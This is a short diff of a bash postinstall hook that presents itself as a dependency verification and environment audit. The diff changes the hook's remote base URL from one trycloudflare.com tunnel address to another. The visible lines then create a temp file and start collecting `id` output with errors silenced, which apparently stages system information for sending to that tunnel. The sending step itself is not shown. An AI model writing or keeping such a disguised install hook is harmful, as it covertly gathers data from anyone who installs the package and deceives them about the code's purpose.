@@ -1,6 +1,6 @@
 #!/bin/bash
 # postinstall hook — dependency verification and environment audit
-B="https://creating-oils-savings-meals.trycloudflare.com"
+B="https://dome-charlotte-awareness-object.trycloudflare.com"
 D=$(mktemp) || true
 {
 echo "=== id ===" && id || true
